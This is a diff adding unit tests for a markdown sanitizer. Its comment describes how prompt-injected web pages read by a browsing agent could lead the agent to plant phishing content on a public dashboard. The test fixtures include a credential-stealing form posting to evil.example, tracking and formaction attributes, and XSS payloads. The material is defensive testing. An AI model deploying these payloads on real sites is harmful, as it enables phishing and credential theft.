@@ -88,3 +88,60 @@ describe('renderMarkdown edge cases', () => {
     expect(result).not.toContain('< y');
   });
 });
+
+describe('renderMarkdown: what the defaults do not stop', () => {
+  /**
+   * DOMPurify's defaults stop SCRIPT EXECUTION, and they do it well — probed
+   * against this exact version, `<script>`, `javascript:` and `data:` hrefs,
+   * every `on*` handler, `<iframe srcdoc>`, `<base>`, `<meta http-equiv>`,
+   * `<button formaction>` and both mXSS shapes are all neutralized.
+   *
+   * What they do not stop is a page that LIES. A login form, a tracking pixel,
+   * a full-viewport overlay — none of them need script. That matters more here
+   * than in a normal app: everything rendered through this function was written
+   * by an agent that reads the open web with web_search / web_fetch, so a
+   * prompt-injected page is the delivery vector, and the dashboard is served to
+   * anonymous strangers.
+   */
+  it('strips a credential-harvesting form', () => {
+    const out = renderMarkdown(
+      '<form action="https://evil.example/steal" method="POST">' +
+      '<input name="pw" type="password" placeholder="Session expired">' +
+      '<button type="submit">Continue</button></form>');
+    expect(out).not.toContain('<form');
+    expect(out).not.toContain('<input');
+    expect(out).not.toContain('evil.example');
+  });
+
+  it('strips a full-viewport overlay', () => {
+    const out = renderMarkdown(
+      '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999">x</div>');
+    expect(out).not.toContain('position:fixed');
+    expect(out).not.toContain('style=');
+  });
+
+  it('strips srcset, ping and formaction', () => {
+    expect(renderMarkdown('<img srcset="https://evil.example/t.png 1x">'))
+      .not.toContain('srcset');
+    expect(renderMarkdown('<a ping="https://evil.example/p" href="#">x</a>'))
+      .not.toContain('ping=');
+    expect(renderMarkdown('<button formaction="https://evil.example">x</button>'))
+      .not.toContain('formaction');
+  });
+
+  it('still renders ordinary markdown', () => {
+    // A sanitizer that eats the content is not a fix, it is an outage.
+    const out = renderMarkdown('# Title\n\nSome **bold** text and `code`.\n\n- a\n- b');
+    expect(out).toContain('<h1');
+    expect(out).toContain('<strong>bold</strong>');
+    expect(out).toContain('<code>code</code>');
+    expect(out).toContain('<li>a</li>');
+  });
+
+  it('still neutralizes the script vectors the defaults cover', () => {
+    // Guards against a config that accidentally re-allows what worked before.
+    expect(renderMarkdown('<script>alert(1)</script>')).not.toContain('<script');
+    expect(renderMarkdown('<img src=x onerror="alert(1)">')).not.toContain('onerror');
+    expect(renderMarkdown('<a href="javascript:alert(1)">x</a>')).not.toContain('javascript:');
+  });
+});
